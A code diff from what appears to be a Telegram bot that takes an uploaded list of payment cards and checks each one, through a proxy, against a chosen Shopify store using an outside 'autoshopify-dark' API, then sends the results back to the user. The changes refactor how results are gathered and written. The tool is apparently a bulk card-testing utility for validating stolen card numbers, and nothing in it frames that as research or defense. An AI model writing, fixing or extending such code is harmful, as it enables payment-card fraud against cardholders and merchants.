@@ -4710,24 +4710,25 @@ async def process_cards(update: Update, file_path: str, file_name: str, site: st
         async def check_card(card):
             async with sem:
                 api_url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}&proxy={PROXY}"
-                print("Checking:", api_url)
                 try:
                     async with session.get(api_url) as resp:
-                        text = await resp.text()
                         try:
                             data = await resp.json()
                             response_text = data.get("Response", "No Response")
                         except Exception:
+                            text = await resp.text()
                             response_text = f"Invalid JSON: {text[:100]}"
                 except Exception as e:
                     response_text = f"Request Error: {e}"
 
-                # Append each card result immediately
-                with open(output_file_path, "a", encoding="utf-8") as out:
-                    out.write(f"{card} => {response_text}\n")
+                return f"{card} => {response_text}"
 
-        # Run all cards concurrently
-        await asyncio.gather(*(check_card(card) for card in cards))
+        # Run all cards concurrently and collect results
+        results = await asyncio.gather(*(check_card(card) for card in cards))
+
+    # Write all results at once to prevent file corruption
+    with open(output_file_path, "w", encoding="utf-8") as out:
+        out.write("\n".join(results))
 
     # Send the result file back to user
     if os.path.exists(output_file_path) and os.path.getsize(output_file_path) > 0:
@@ -4744,7 +4745,7 @@ async def process_cards(update: Update, file_path: str, file_name: str, site: st
     except:
         pass
 
-# ---------------- Unified handler ---------------- #
+
 async def mtxt_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user_data = await get_user(user_id)
@@ -4768,17 +4769,15 @@ async def mtxt_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    await update.message.reply_text(
-        "✅ Processing started in the background. You will get results when done!"
-    )
+    await update.message.reply_text("✅ Processing started. Please wait...")
 
     # Save file
     file_path = os.path.join(DOWNLOAD_FOLDER, f"{update.message.message_id}_{document.file_name}")
     file = await document.get_file()
     await file.download_to_drive(file_path)
 
-    # Run processing in background
-    asyncio.create_task(process_cards(update, file_path, document.file_name, site))
+    # Await processing instead of creating a detached task
+    await process_cards(update, file_path, document.file_name, site)
 
 
 
